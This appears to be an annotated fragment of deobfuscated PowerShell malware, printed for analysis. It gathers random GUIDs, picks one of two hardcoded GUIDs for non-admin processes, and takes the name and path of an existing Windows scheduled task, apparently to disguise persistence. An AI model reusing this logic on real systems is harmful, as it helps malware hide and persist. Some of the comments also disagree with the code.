# INPUT PARAM: $os7, bool True if process is running as ADMINISTRATOR, False otherwise
# OUTPUT: list or null (if error getting registered scheduled tasks)
    # index 0-2: random GUIDs
    # index 3 : 
        # IF process is NOT running as ADMINISTRATOR
            # GUID either {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} or {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
        # otherwise 0
    # index 4: random path of one of the currently registered scheduled tasks in \Microsoft\Windows
        # empty string if no registered tasks
    # index 5: random name of one of the currently registered scheduled tasks in \Microsoft\Windows 
        # empty string if no registered tasks
    # index 6: same GUID as element 4

$an9 = Get-Random;

# from list of currently registered scheduled tasks in \Microsoft\Windows, a random 
# Path and Name of two of them and a GUID in that order
$pw8 = vr4 $an9;

# bug out if there was an error getting scheduled tasks
if($pw8){
}
else{
	return 
}

$zn9 = 3;
$bf7 = @(0,0,0,0);

# generate three random GUIDs insert into first 3 elements of $bf7
for($yi9=0; $yi9 -lt $zn9; $yi9++) {
	$bf7[$yi9] = yw3 $an9;
    $an9++ 
}

# if the process is NOT running as ADMINISTRATOR
if($os7 -eq $false) {
    # set the last element of $bf7 (oz8=3) to the GUID we got from vr4
	$bf7[$oz8] = $pw8[2] 
}

($bf7 + $pw8)